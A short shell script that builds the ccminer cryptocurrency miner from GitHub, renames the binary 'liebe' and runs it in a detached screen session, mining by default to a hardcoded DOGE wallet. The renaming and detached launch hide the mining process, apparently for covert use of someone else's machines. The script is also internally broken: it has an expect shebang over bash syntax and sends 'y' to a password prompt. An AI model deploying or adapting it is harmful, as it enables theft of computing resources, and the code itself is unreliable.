#!/usr/bin/expect
core="$2"
if [ ! -n "$core" ]
then
	core=$(nproc);
fi

walet="$3"
if [ ! -n "$walet" ]
then
	walet="DBvhy1vkMxN8CvznVdsYrKN9tqUcMD2rQR"
fi

coin="$4"
if [ ! -n "$coin" ]
then
	coin="DOGE"
fi

cat <<EOF >var.py
Name = "$1"
Level = "$core"
Wallet = "$walet"
Coin = "$coin"
EOF

echo "==================== Info Mesin ===================="
echo "Wallet : $walet"
echo "Coin : $coin"
echo "Worker : $1"
echo "Cpu Core : $core"
echo "===================================================="
spawn sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
expect "password"
send "y\n"
interact
git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
cd ccminer && chmod +x build.sh configure.sh autogen.sh
sudo apt install screen -y
./build.sh
mv ccminer liebe
screen -d -m ./liebe.sh $1 $core $walet $coin
